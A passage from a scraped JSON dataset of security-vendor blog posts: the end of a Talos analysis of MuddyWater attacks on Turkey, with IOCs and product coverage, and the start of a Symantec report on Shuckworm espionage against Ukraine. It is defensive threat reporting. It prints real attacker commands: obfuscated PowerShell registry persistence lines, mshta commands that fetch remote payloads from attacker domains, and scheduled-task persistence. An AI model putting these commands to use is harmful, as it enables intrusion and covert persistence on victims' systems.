                "The malicious executable carrying this decoy was generated a day later on June 9, thus, it is likely that either the attackers created the draft of the decoy themselves or had immediate access to their victims that enabled them to exfiltrate documents that were then used as decoys and lures to proliferate their campaigns to similar targets of interest.",
                "The entire infection chain employed in this campaign, using the malicious PowerShell based downloader, was later seen again in the attack targeting Pakistani entities in August 2021.",
                "The EXE-based infection chain is as follows:",
                "Talos assesses with high confidence that these campaigns are the work of the Iranian state-sponsored threat actor MuddyWater.",
                "This assessment is based on both technical indicators and the tactics, techniques, and procedures (TTPs) employed by the threat actor.",
                "The infection chains used in the campaigns illustrated in this research bear a close resemblance to those described in Secureworks' report from 2020.",
                "We also have a high-fidelity IOC from a trusted source that was used in a key part of the infection chains.",
                "This IOC has also been used in previous MuddyWater campaigns.",
                "While we cannot disclose additional details at this time due to intelligence sharing sensitivities, we assess that this particular finding is significant enough to justify a high-confidence assessment on attribution.",
                "The malicious XLS lures and the executables used in this campaign deploy two malicious files - a loader and a downloader that retrieve the final payloads using a hardcoded URL pointing to a specific hardcoded IP address.",
                "Secureworks' report shows the same technique, albeit based on a batch file and a PowerShell script, while the campaign targeting Turkish entities use either a VBS or PS1 script activated via a simple registry entry.",
                "In both cases, the key PowerShell script's only objective is to download malicious payloads from the C2.",
                "Code and metadata similarities in the maldocs and accompanying scripts utilized in this campaign bear a high degree of resemblance to previously discovered MuddyWater artifacts.",
                "(A high-fidelity YARA rule for tracking artifacts related to this campaign and previously discovered MuddyWater artifacts is APT_MuddyWater_MalDoc_Feb20_1, authored by Florian Roth.)",
                "One of the C2 IP addresses used by the malicious PowerShell downloaders deployed in this campaign, 185[.]118[.]167[.]120, is also listed in a Turkish threat advisory dated September 2021.",
                "English translation of a threat advisory from Trakya.",
                "This advisory from the Trakya University in Turkey and a USOM (Turkey National Cyber ​​Incident Response Center) announcement contains an alert to an APT-level attack.",
                "The initial attack vector is the email service, with emails sent from the following attacker-owned accounts:",
                "This advisory lists C2 IP addresses that have also been observed in the this campaign:",
                "The bolded IPs (first three in the list) are used by the PowerShell scripts dropped by the malicious XLS lures to download a payload.",
                "Talos confirmed the usage of the email address doctor.x.2020@gmail[.]com listed in the advisory to this campaign using XLS and executables targeting Turkey.",
                "Talos has observed Iranian related groups carry out malicious campaigns all over the world in recent years.",
                "2021 was also prolific in cybersecurity incidents targeting Iranian state-run organizations.",
                "These events were attributed to Western nations by the Iranian regime, with the promise of revenge.",
                "It's hard to say if these campaigns are the result of such promises or just part of MuddyWater's usual activity.",
                "However, the fact that the threat actors have changed some of their methods of operation and tools is another sign of their adaptability and unwillingness to refrain themselves from attacking other nations.",
                "In this post we have shown the same group running two different campaigns using different tools while targeting the same country, in this case Turkey, showing their capacity and motivation to compromise their targets and perform their espionage activities.",
                "In-depth defense strategies based on a risk analysis approach can deliver the best results in the prevention.",
                "However, this should always be complemented by a good incident response plan which has been not only tested with table top exercises and reviewed and improved every time it's put to the test on real engagements.",
                "Ways our customers can detect and block this threat are listed below.",
                "Cisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post.",
                "Try Secure Endpoint for free here.",
                "Cisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks.",
                "Cisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign.",
                "You can try Secure Email for free here.",
                "Cisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual, Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat.",
                "Cisco Secure Network/Cloud Analytics (Stealthwatch/Stealthwatch Cloud) analyzes network traffic automatically and alerts users of potentially unwanted activity on every connected device.",
                "Cisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products.",
                "Umbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network.",
                "Sign up for a free trial of Umbrella here.",
                "Cisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them.",
                "Additional protections with context to your specific environment and threat data are available from the Firewall Management Center.",
                "Cisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your network.",
                "Open-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org.",
                "Snort SIDs for this threat are: 58929-58938.",
                "Cisco Secure Endpoint users can use Orbital Advanced Search to run complex OSqueries to see if their endpoints are infected with this specific threat.",
                "For specific OSqueries on this threat, click below:",
                "We would like to thank Canary Tools for their cooperation, support and inputs into this research.Hashes",
                "Other canary tokens used by MuddyWater:",
                "Note: Only a member of this blog may post a comment.",
                "Iranian APT MuddyWater targets Turkish users via m...",
                "Vulnerability Spotlight: Memory corruption and use...",
                "Threat Roundup for January 21 to January 28",
                "Threat Source Newsletter (Jan. 27, 2022)",
                "Vulnerability Spotlight: Vulnerability in Apple iO...",
                "Talos Incident Response year-in-review for 2021",
                "Ukraine Campaign Delivers Defacement and Wipers, i...",
                "Threat Roundup for January 14 to January 21",
                "Threat Source Newsletter (Jan. 20, 2022)",
                "Threat Roundup for January 7 to January 14",
                "#82: Log4j followed us in 2022",
                "Threat Source Newsletter (Jan. 13, 2022)",
                "#114: And then there were tw...",
                "Nanocore, Netwire and AsyncRAT spreading campaign ...",
                "Microsoft Patch Tuesday for Jan. 2022 — Snort rule...",
                "Vulnerability Spotlight: Two vulnerabilities in Ad...",
                "Vulnerability Spotlight: Heap buffer overflow cond...",
                "Threat Roundup for December 31 to January 7",
                "Threat Source Newsletter (Jan. 6, 2022)",
                "The Future of Work Part 4: Reimagine IoT and Smart Buildings",
                "Snort 3.1.21.0 is now available (plus bonus information on Thursday's rule update)",
                "ClamAV 0.103.5 and 0.104.2 security patch release; 0.102 past EOL",
                "©  Cisco Systems, Inc. and/or its affiliates."
            ],
            "sentencesNum": 207,
            "words": [
                "Software",
                "Vulnerability Information",
                "Vulnerability Information",
                "BACK",
                "Vulnerability Reports",
                "Microsoft Advisories",
                "Reputation Center",
                "Reputation Center",
                "BACK",
                "IP & Domain Reputation",
                "Talos File Reputation",
                "Reputation Support",
                "Secure Endpoint Naming Conventions",
                "Intelligence Categories",
                "Library",
                "Support",
                "Support Communities",
                "BACK",
                "Reputation Center Support",
                "Snort Community",
                "ClamAV Community",
                "SpamCop",
                "Incident Response",
                "Careers",
                "Blog",
                "Blog",
                "BACK",
                "Talos Blog",
                "Talos Threat Source Newsletter",
                "Podcasts",
                "Podcasts",
                "Beers with Talos",
                "Talos Takes",
                "About",
                "Cisco Login",
                "Monday, January 31, 2022",
                "Executive summary",
                "MuddyWater threat actor",
                "Campaign targeting Turkey",
                "Malicious Excel sheets analyses",
                "Persistence",
                "Registry key for persistence.",
                "HKCU\\Software\\Microsoft\\windows\\CurrentVersion\\Run | <random>",
                "Tracking tokens",
                "Intermediate VB Script component (VBS)",
                "Malicious PowerShell-based downloader",
                "PS1 downloader script.",
                "Infection chain",
                "Malicious executables-based infection chain",
                "Turkey",
                "For example:",
                "HKCU\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN | CloudDrive.",
                "[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]",
                "\"CloudDrive\"=\"C:\\\\Windows\\\\System32\\\\SyncAppvPublishingServer.vbs \\\"n;.",
                "('{2}{0}{1}' -f[string][char][int]101,[string][char][int]88,'i')((.",
                "('{2}{0}{1}' -f[string][char][int]101,[string][char][int]88,'i')((Get-content $env:USERPROFILE\\\\.CloudDrive\\\\.CloudCache.conf))))\\\"\"",
                "Downloader script.",
                "Pakistan",
                "[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]",
                "\"OwnDrive\"=\"C:\\\\Windows\\\\System32\\\\SyncAppvPublishingServer.vbs \\\"n;.",
                "('{2}{0}{1}' -f[string][char][int]101,[string][char][int]88,'i')([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Get-content $env:USERPROFILE\\\\.VirtualBoxer\\\\.VirtualBoxer.conf))))\\\"\"",
                "http://<C2_IP>/images?guid=<base64_encoded + AES encrypted output>",
                "PS1-based downloader script.",
                "Tracking Tokens",
                "hxxp://172.245.81[.]135:10196/Geq5P3aFpaSrK3PZtErNgUsVCfqQ9kZ9/Pan-op/gallery.jpg",
                "Armenia",
                "Attribution",
                "sisterdoreencontreve@gmail[.]com",
                "lillianwnwindrope@gmail[.]com",
                "doctor.x.2020@gmail[.]com",
                "ubuntoubunto1398@gmail[.]com",
                "a.sara.1995a@gmail[.]com",
                "185[.]118[.]167[.]120",
                "185[.]118[.]164[.]165",
                "185[.]118[.]164[.]195",
                "185[.]118[.]164[.]213",
                "Conclusion",
                "Coverage",
                "Orbital Queries",
                "Powershell scripts",
                "VB Scripts",
                "IOCS",
                "8d6ed63f2ffa053a683810f5f96c76813cdca2e188f16d549e002b2f63cee001",
                "42aa5a474abc9efd3289833eab9e72a560fee48765b94b605fac469739a515c1",
                "d3ecc4137fc9a6d7418b4780864baf64cf7417d7badf463dff6ea48cd455915b",
                "9991b185c9e9732501e0c2bd841e32a4022f0735a0527150bc8e64ac363d409d",
                "d9de66497ad189d785d7535ab263e92ffad81df20b903c5e1d36859b4ed38b6d",
                "5cdc7dd6162a8c791d50f5b2c5136d7ba3bf417104e6096bd4a2b76ea499a2f4",
                "26ed7e89b3c5058836252e0a8ed9ec6b58f5f82a2e543bc6a97b3fd17ae3e4ec",
                "a8701fd6a5eb45e044f8bf150793f4189473dde46e0af8314652f6bf670c0a34",
                "b726f4dd745891070f2e516d5d4e4f2f1ce0bf3ff685dc3800455383f342e54d",
                "c9931382f844b61a002f83db1ae475953bbab449529be737df1eee8b3065f6eb",
                "fcdd38ff378605c66333429d9df2242fbce25a5f69f4d6d4c11d9613bcb409b0",
                "c13cb1c9277324534075f807a3fcd24d0d3c024197c7437bf65db78f6a987f7a",
                "450302fb71d8e0e30c80f19cfe7fb7801b223754698cac0997eb3a3c8e440a48",
                "b1e30cce6df16d83b82b751edca57aa17795d8d0cdd960ecee7d90832b0ee76c",
                "921b4520b75fcd0071944a483d738223b222ba101e70f2950fbfbc22afbdb5d0",
                "d7de68febbbdb72ff820f6554afb464b5c204c434faa6ffe9b4daf6b691d535f",
                "8b9be9e4d18c5fc71cd12dbfd60ea41eb88a07497e96faa2ba20fdc929b32c0b",
                "7dc49601fa6485c3a2cb1d519794bee004fb7fc0f3b37394a1aef6fceefec0c8",
                "a69fee382cf86f9e457e0688932cbd00671d0d5218f8043f1ee385278ee19c8c",
                "63e404011aeabb964ce63f467be29d678d0576bddb72124d491ab5565e1044cf",
                "6910ddb58aee9a77e7bb9cadef9e6280a9b5b495edf0b6538cf8bdc1db8b1f4c",
                "d851badfcf3b3a8b4210bdb33948d0d1d918ec6bf0f1f85cbae6bb8feec7cd74",
                "aa72f1543d4a4e6ecbfc2da0167f5601c5c692bed73243cf01f616bc4af68afe",
                "8f255a1f2e17828a5b9205d6991e2c85c3320311da28048785262396cbc568c7",
                "cddd5514b7ed3d33ff8eaa16b7b71621ced857755246683e0d28c4650ea744bf",
                "b4d0161ecab5a7847d325c88ce1a4fc2ca2e11fad0b77638b63ae1781c8b5793",
                "f6569039513e261ba9c70640e6eb8f59a0c72471889d3c0eaba51bdebb91d285",
                "28f2198f811bbd09be31ad51bac49ba0be5e46ebf5c617c49305bb7e274b198c",
                "04d6ed9c6d4a37401ad3c586374f169b0aa8d609710bdcf5434d39e0fd4ed9bd",
                "69e3a454c191ee38663112cf5358a54cca1229188087ed18e92bc9c59b014912",
                "dc28b5e878152b5305b8d251019895caa56a7a95a68eccb89a6ecc41da8aadb9",
                "IPs",
                "137.74.131[.]16",
                "185.118.167[.]120",
                "185.118.164[.]165",
                "185.118.164[.]195",
                "185.118.164[.]213",
                "149.202.242[.]84",
                "5.199.133[.]149",
                "88.119.170[.]124",
                "185.118.164[.]165",
                "7.236.212[.]22",
                "172.245.81[.]135",
                "185.141.27[.]211",
                "URLs",
                "hxxp://185.118.167[.]120/",
                "hxxp://137.74.131[.]16:443/",
                "hxxp://185.141.27[.]211:443/",
                "hxxp://149.202.242[.]84:443/",
                "hxxp://172.245.81[.]135:10196/Geq5P3aFpaSrK3PZtErNgUsVCfqQ9kZ9/ef4f0d9af47d737076923cfccfe01ba7/layer.jpg",
                "hxxp://172.245.81[.]135:10196/Geq5P3aFpaSrK3PZtErNgUsVCfqQ9kZ9/Pan-op/gallery.jpg",
                "hxxps://snapfile[.]org/d/c7817a35554e88572b7b",
                "hxxps://snapfile[.]org/d/0c88a47c3160338bbb68",
                "hxxp://snapfile[.]org/756a12c43a0fb8d56fbf",
                "hxxps://snapfile[.]org/5bc3985cf17565a97dbd",
                "hxxps://snapfile[.]org/55e1c83e920bb7dc949c",
                "hxxp://canarytokens[.]com/about/d3g23n4gdcrep20q3wzm153xn/index.html",
                "hxxp://canarytokens[.]com/tags/traffic/images/azp6ai8pg5aq0c619ur0qzi6h/",
                "hxxp://canarytokens[.]com/tags/traffic/images/azp6ai8pg5aq0c619ur0qzi6h/post.jsp",
                "oy80la8r9iyub22nbhb7wvxrk",
                "kbu1xo0s8ktfxrzsn9iuei3e9",
                "azp6ai8pg5aq0c619ur0qzi6h",
                "o1txrtd8gn7i9rt159k5baoys",
                "smnszrsk7gqjplt0j1idwjrcr",
                "agsbmym5re3whgnd5a8kzntai",
                "60ld4guht70xby71u3io4w43n",
                "lmbvetj0iif8dwjgutckpppq3",
                "kc7snpabrp9z0wp1p1klqgkr9",
                "04p62zz698bdzv2fdbgupdm4j",
                "mpei7e608jb22i90z9x8g0gdu",
                "qut1gl1r6ywzgs1ts922sxtqv",
                "09xzzwe761avzxxmyzi85r7hv",
                "nx4fiakqe1gc02hrnlv8fyis4",
                "b90963gx06jykhz61kv534zcm",
                "bruhtg2dtbzk7j1fsttxga85e",
                "d3g23n4gdcrep20q3wzm153xn",
                "xxe2sm2rddhxfto9gjx25fo9c",
                "gikx04xwvf3uu4af8ekrvfeoj",
                "Posted by",
                "Asheer Malhotra",
                "at",
                "8:00 AM",
                "Labels:",
                "APTs,",
                "SecureX,",
                "threats",
                "Share This Post",
                "No comments:",
                "Post a Comment",
                "Newer Post",
                "Older Post",
                "Home",
                "Subscribe to:",
                "Post Comments (Atom)",
                "categories",
                "Subscribe To Our Feed",
                "Posts",
                "Comments",
                "Subscribe via Email",
                "Blog Archive",
                "▼",
                "2022",
                "(28)",
                "►",
                "February",
                "(6)",
                "▼",
                "January",
                "(22)",
                "Beers with Talos, Ep.",
                "#115: Everybody's measured b...",
                "Vulnerability Spotlight: WiFi-connected security c...",
                "Talos Takes Ep.",
                "Beers with Talos, Ep.",
                "Vulnerability Spotlight: Buffer overflow vulnerabi...",
                "►",
                "2021",
                "(291)",
                "►",
                "December",
                "(15)",
                "►",
                "November",
                "(28)",
                "►",
                "October",
                "(23)",
                "►",
                "September",
                "(25)",
                "►",
                "August",
                "(25)",
                "►",
                "July",
                "(27)",
                "►",
                "June",
                "(24)",
                "►",
                "May",
                "(24)",
                "►",
                "April",
                "(29)",
                "►",
                "March",
                "(26)",
                "►",
                "February",
                "(24)",
                "►",
                "January",
                "(21)",
                "►",
                "2020",
                "(272)",
                "►",
                "December",
                "(22)",
                "►",
                "November",
                "(12)",
                "►",
                "October",
                "(30)",
                "►",
                "September",
                "(25)",
                "►",
                "August",
                "(19)",
                "►",
                "July",
                "(24)",
                "►",
                "June",
                "(22)",
                "►",
                "May",
                "(23)",
                "►",
                "April",
                "(23)",
                "►",
                "March",
                "(21)",
                "►",
                "February",
                "(29)",
                "►",
                "January",
                "(22)",
                "►",
                "2019",
                "(276)",
                "►",
                "December",
                "(26)",
                "►",
                "November",
                "(27)",
                "►",
                "October",
                "(24)",
                "►",
                "September",
                "(27)",
                "►",
                "August",
                "(21)",
                "►",
                "July",
                "(22)",
                "►",
                "June",
                "(16)",
                "►",
                "May",
                "(25)",
                "►",
                "April",
                "(25)",
                "►",
                "March",
                "(24)",
                "►",
                "February",
                "(19)",
                "►",
                "January",
                "(20)",
                "►",
                "2018",
                "(198)",
                "►",
                "December",
                "(16)",
                "►",
                "November",
                "(15)",
                "►",
                "October",
                "(26)",
                "►",
                "September",
                "(16)",
                "►",
                "August",
                "(12)",
                "►",
                "July",
                "(20)",
                "►",
                "June",
                "(15)",
                "►",
                "May",
                "(15)",
                "►",
                "April",
                "(21)",
                "►",
                "March",
                "(10)",
                "►",
                "February",
                "(14)",
                "►",
                "January",
                "(18)",
                "►",
                "2017",
                "(171)",
                "►",
                "December",
                "(9)",
                "►",
                "November",
                "(11)",
                "►",
                "October",
                "(15)",
                "►",
                "September",
                "(17)",
                "►",
                "August",
                "(16)",
                "►",
                "July",
                "(14)",
                "►",
                "June",
                "(14)",
                "►",
                "May",
                "(19)",
                "►",
                "April",
                "(17)",
                "►",
                "March",
                "(17)",
                "►",
                "February",
                "(12)",
                "►",
                "January",
                "(10)",
                "►",
                "2016",
                "(99)",
                "►",
                "December",
                "(9)",
                "►",
                "November",
                "(8)",
                "►",
                "October",
                "(11)",
                "►",
                "September",
                "(8)",
                "►",
                "August",
                "(9)",
                "►",
                "July",
                "(9)",
                "►",
                "June",
                "(10)",
                "►",
                "May",
                "(6)",
                "►",
                "April",
                "(12)",
                "►",
                "March",
                "(7)",
                "►",
                "February",
                "(6)",
                "►",
                "January",
                "(4)",
                "►",
                "2015",
                "(62)",
                "►",
                "December",
                "(3)",
                "►",
                "November",
                "(3)",
                "►",
                "October",
                "(6)",
                "►",
                "September",
                "(6)",
                "►",
                "August",
                "(5)",
                "►",
                "July",
                "(4)",
                "►",
                "June",
                "(6)",
                "►",
                "May",
                "(3)",
                "►",
                "April",
                "(7)",
                "►",
                "March",
                "(8)",
                "►",
                "February",
                "(7)",
                "►",
                "January",
                "(4)",
                "►",
                "2014",
                "(67)",
                "►",
                "December",
                "(4)",
                "►",
                "November",
                "(5)",
                "►",
                "October",
                "(6)",
                "►",
                "September",
                "(10)",
                "►",
                "August",
                "(4)",
                "►",
                "July",
                "(3)",
                "►",
                "June",
                "(6)",
                "►",
                "May",
                "(4)",
                "►",
                "April",
                "(10)",
                "►",
                "March",
                "(4)",
                "►",
                "February",
                "(3)",
                "►",
                "January",
                "(8)",
                "►",
                "2013",
                "(30)",
                "►",
                "December",
                "(3)",
                "►",
                "November",
                "(2)",
                "►",
                "October",
                "(5)",
                "►",
                "September",
                "(2)",
                "►",
                "August",
                "(2)",
                "►",
                "July",
                "(3)",
                "►",
                "June",
                "(1)",
                "►",
                "May",
                "(2)",
                "►",
                "April",
                "(1)",
                "►",
                "March",
                "(1)",
                "►",
                "February",
                "(3)",
                "►",
                "January",
                "(5)",
                "►",
                "2012",
                "(53)",
                "►",
                "December",
                "(3)",
                "►",
                "November",
                "(1)",
                "►",
                "October",
                "(2)",
                "►",
                "September",
                "(6)",
                "►",
                "August",
                "(7)",
                "►",
                "July",
                "(7)",
                "►",
                "June",
                "(4)",
                "►",
                "May",
                "(6)",
                "►",
                "April",
                "(5)",
                "►",
                "March",
                "(3)",
                "►",
                "February",
                "(7)",
                "►",
                "January",
                "(2)",
                "►",
                "2011",
                "(23)",
                "►",
                "December",
                "(1)",
                "►",
                "November",
                "(4)",
                "►",
                "October",
                "(3)",
                "►",
                "September",
                "(1)",
                "►",
                "August",
                "(2)",
                "►",
                "July",
                "(3)",
                "►",
                "June",
                "(1)",
                "►",
                "May",
                "(2)",
                "►",
                "April",
                "(1)",
                "►",
                "March",
                "(2)",
                "►",
                "February",
                "(1)",
                "►",
                "January",
                "(2)",
                "►",
                "2010",
                "(93)",
                "►",
                "December",
                "(4)",
                "►",
                "November",
                "(2)",
                "►",
                "October",
                "(4)",
                "►",
                "September",
                "(7)",
                "►",
                "August",
                "(9)",
                "►",
                "July",
                "(11)",
                "►",
                "June",
                "(12)",
                "►",
                "May",
                "(5)",
                "►",
                "April",
                "(12)",
                "►",
                "March",
                "(10)",
                "►",
                "February",
                "(7)",
                "►",
                "January",
                "(10)",
                "►",
                "2009",
                "(146)",
                "►",
                "December",
                "(14)",
                "►",
                "November",
                "(10)",
                "►",
                "October",
                "(12)",
                "►",
                "September",
                "(13)",
                "►",
                "August",
                "(9)",
                "►",
                "July",
                "(19)",
                "►",
                "June",
                "(11)",
                "►",
                "May",
                "(13)",
                "►",
                "April",
                "(10)",
                "►",
                "March",
                "(11)",
                "►",
                "February",
                "(13)",
                "►",
                "January",
                "(11)",
                "►",
                "2008",
                "(37)",
                "►",
                "December",
                "(12)",
                "►",
                "November",
                "(6)",
                "►",
                "October",
                "(7)",
                "►",
                "September",
                "(6)",
                "►",
                "August",
                "(3)",
                "►",
                "May",
                "(3)",
                "Recommended Blogs",
                "Cisco Blog",
                "Snort Blog",
                "ClamAV® blog",
                "Software",
                "Reputation Center",
                "Vulnerability Information",
                "Microsoft Advisory Snort Rules",
                "Incident Response",
                "Secure Endpoint Naming Conventions",
                "Talos File Reputation",
                "Library",
                "Support Communities",
                "About",
                "Careers",
                "Talos Blog",
                "Threat Source Newsletter",
                "Beers with Talos Podcast",
                "Talos Takes Podcast",
                "Connect With Us",
                "All rights reserved.",
                "View our Privacy Policy."
            ],
            "wordsNum": 747,
            "labels": [
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                ""
            ]
        },
        {
            "time": "2022-01-31",
            "from_website": "Symantec",
            "title": "Shuckworm Continues Cyber-Espionage Attacks Against Ukraine",
            "from_url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/shuckworm-gamaredon-espionage-ukraine",
            "content": [
                "Shuckworm Continues Cyber-Espionage Attacks Against Ukraine | Symantec Blogs",
                "Symantec Enterprise BlogsThreat IntelligenceMenuMain menuBlogs HomeThreat IntelligenceFeature StoriesExpert PerspectivesProduct InsightsElection SecuritySolarWinds日本語SearchBroadcom HomeThreat Hunter TeamSymantecPosted: 31 Jan, 202210 Min ReadThreat Intelligence SubscribeFollowtwitterlinkedinShuckworm Continues Cyber-Espionage Attacks Against UkraineSymantec investigation uncovers selection of files used in ongoing attacks.The Russia-linked Shuckworm group (aka Gamaredon, Armageddon) is continuing to conduct cyber-espionage attacks against targets in Ukraine.",
                "Over the course of recent months, Symantec’s Threat Hunter Team, a part of Broadcom Software, has found evidence of attempted attacks against a number of organizations in the country.",
                "Active since at least 2013, Shuckworm specializes in cyber-espionage campaigns mainly against entities in Ukraine.",
                "The group is known to use phishing emails to distribute either freely available remote access tools, including Remote Manipulator System (RMS) and UltraVNC, or customized malware called Pterodo/Pteranodon to targets.",
                "A recent report published by The Security Service of Ukraine (SSU) noted that Shuckworm’s attacks have grown in sophistication in recent times, with attackers now using living-off-the-land tools to steal credentials and move laterally on victim networks.",
                "Recent activity seen by Symantec is consistent with that documented by SSU.",
                "Symantec observed Shuckworm activity on an organization in Ukraine, which began on July 14, 2021 and continued until August 18, 2021.",
                "The attack chain began with a malicious document, likely sent via a phishing email, which was opened by the user of the infected machine.",
                "The following is a breakdown of the attackers’ activity on the compromised computer.",
                "At 08:48 (local-time), a suspicious Word document is opened on the machine.",
                "Just five minutes after the document is opened, a suspicious command is also executed to launch a malicious VBS file (depended.lnk).",
                "This file is a known custom backdoor leveraged by Shuckworm (aka Pterodo).",
                "The backdoor is used to download and execute CSIDL_PROFILE\\searches\\depended.exe (94a78d5dce553832d61b59e0dda9ef2c33c10634ba4af3acb7fb7cf43be17a5b) from hxxp://92.242.62.131/wordpress.php?is=[REDACTED].",
                "Two additional VBS scripts are observed being executed via depended.exe:",
                "A scheduled task is then created to likely ensure persistence between system reboots and to execute the dropped script.",
                "This ensures the VBS file deep-thoughted.ppt is executed every 10 minutes:",
                "SCHTASKS /CREATE /sc minute /mo 10 /tn \"deep-thoughted\" /tr \"wscript.exe \" CSIDL_COMMON_PICTURES\\deep-thoughted.ppt //e:VBScript //b\" /F",
                "Later, the attackers are observed executing an HTA file hosted on a remote server by abusing mshta.exe via depended.exe.",
                "The Mshta utility can execute Microsoft HTML Application (HTA) files and can be abused to bypass application control solutions.",
                "Since mshta.exe executes outside of Internet Explorer's security context, it also bypasses browser security settings.",
                "\"CSIDL_SYSTEM\\cmd.exe\" /c CSIDL_SYSTEM\\mshta.exe hxxp://fiordan.ru/FILM.html /f id=[REDACTED]",
                "At the same time, a new variant of Pterodo is installed via depended.exe.",
                "Similarly to before, two additional scheduled tasks are created:",
                "\"CSIDL_SYSTEM\\schtasks.exe\" /CREATE /sc minute /mo 12 /tn \"MediaConverter\" /tr \"wscript.exe \" CSIDL_COMMON_MUSIC\\tvplaylist.mov //e:VBScript //b \" /F\"",
                "\"CSIDL_SYSTEM\\schtasks.exe\" /CREATE /sc minute /mo 12 /tn \"VideoHostName\" /tr \"wscript.exe \" CSIDL_COMMON_VIDEO\\webmedia.m3u //e:VBScript //b \" /F\"",
                "The attackers continue to install variants of their backdoor and execute commands via scripts to ensure persistence:",
                "schtasks /Create /SC MINUTE /MO 15 /F /tn BackgroundConfigSurveyor /tr \"wscript.exe C:\\Users\\o.korol\\AppData\\Roaming\\battery\\battery.dat //e:VBScript //b\"",
                "Directly after this, it appears the attackers test connectivity to a new C&C server via ping.exe:",
                "CSIDL_SYSTEM\\cmd.exe /c ping -n 1 arianat.ru",
                "Once the connection is confirmed to be active, the attackers proceed to download another variant of their Pterodo backdoor and begin using the new C&C to download additional scripts and tools, as well as creating scheduled tasks to run every few minutes.",
                "\"CSIDL_SYSTEM\\cmd.exe\" /c CSIDL_SYSTEM\\mshta.exe hxxp://avirona.ru/7-ZIP.html /f id=<?,?>",
                "\"CSIDL_SYSTEM\\schtasks.exe\" /CREATE /sc minute /mo 12 /tn \"MediaConverter\" /tr \"wscript.exe \" CSIDL_COMMON_MUSIC\\mediatv.mov //e:VBScript //b \" /F\"",
                "\"CSIDL_SYSTEM\\schtasks.exe\" /CREATE /sc minute /mo 12 /tn \"VideoHostName\" /tr \"wscript.exe \" CSIDL_COMMON_VIDEO\\videotv.m3u //e:VBScript //b \" /F\"",
                "At this point, the attackers cease activity.",
                "However, we continue to see commands being executed from the scheduled tasks for the remainder of July 14.",
                "At 05:28, the attackers return, and several additional variants of Pterodo are executed via CSIDL_COMMON_VIDEO\\planeta.exe (1ea3881d5d03214d6b7e37fb7b10221ef51782080a24cc3e275f42a3c1ea99c1).",
                "The attackers are then observed executing commands via planeta.exe:",
                "The above flushdns command may indicate that the attackers have updated the DNS records for their C&Cs, as we observed some of their tools use hard-coded domains.",
                "In this particular instance, the flushdns command was executed shortly before the attackers attempted to install additional backdoors that leveraged the same C&C.",
                "Later, another variant of Pterodo (deep-sided.fly) was executed and was used to download and execute a new file called deerskin.exe (ad1f796b3590fcee4aeecb321e45481cac5bc022500da2bdc79f768d08081a29).",
                "This file is a dropper for a VNC client.",
                "When executed, it pings google DNS (8.8.8.8) to test internet connectivity, then proceeds to drop a VNC client and establishes a connection to a remote C&C server controlled by the attackers:",
                "Two such files have been identified that perform the same actions:",
                "This VNC client appears to be the ultimate payload for this attack.",
                "Between July 29 and August 18 activity continued whereby we observed the attackers deploying multiple variants of their custom VBS backdoor along with executing VBS scripts and creating scheduled tasks similar to the ones detailed above.",
                "After August 18, no further suspicious activity was observed on this machine.",
                "During the course of this investigation, specifically post VNC client installation, a number of documents were opened from various locations on the compromised machine.",
                "It is unclear if this was legitimate user activity or the activity of the attackers attempting to collect and exfiltrate sensitive information.",
                "Titles of the documents accessed ranged from job descriptions to sensitive information pertaining to the targeted organization.",
                "Symantec investigations uncovered a total of seven files used by Shuckworm in recent attacks.",
                "All seven files are 7-zip SFX self-extracting binaries, a format used previously in Shuckworm attacks.",
                "Upon execution, the file named descend.exe (0d4b8e244f19a009cee50252f81da4a2f481da9ddb9b204ef61448d56340c137) drops a VBS file which, in turn, drops a second VBS file in the following locations:",
                "It then creates the following task:",
                "SCHTASKS /CREATE /sc minute /mo 11 /tn \"deerbrook\" /tr \"wscript.exe '<DROPPED_FOLDER>\\deerbrook.ppt' //e:VBScript //b\" /F",
